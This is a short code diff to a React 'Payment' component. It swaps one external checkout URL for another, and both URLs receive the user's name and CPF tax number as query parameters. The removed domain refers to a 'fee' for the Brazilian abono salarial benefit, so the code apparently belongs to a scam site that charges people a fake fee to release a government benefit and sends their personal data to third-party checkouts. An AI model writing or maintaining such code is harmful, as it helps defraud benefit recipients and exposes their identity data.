@@ -56,7 +56,7 @@ const Payment: React.FC = () => {
   const openPaymentIframe = () => {
     const name = localStorage.getItem("name") || userData?.nome || "";
     const cpf = localStorage.getItem("cpf") || userData?.cpf || "";
-    const url = `https://pay.pagamento-taxa-abono-salarial.shop/N1nVZpEdY60GlM6?name=${encodeURIComponent(name)}&document=${encodeURIComponent(cpf)}`;
+    const url = `https://nitropaycheckout.com.br/checkout/34842aea-9cb1-4af2-b1b8-b95a07e151b9?name=${encodeURIComponent(name)}&document=${encodeURIComponent(cpf)}`;
     
     if (isMobile) {
       setSheetOpen(true);
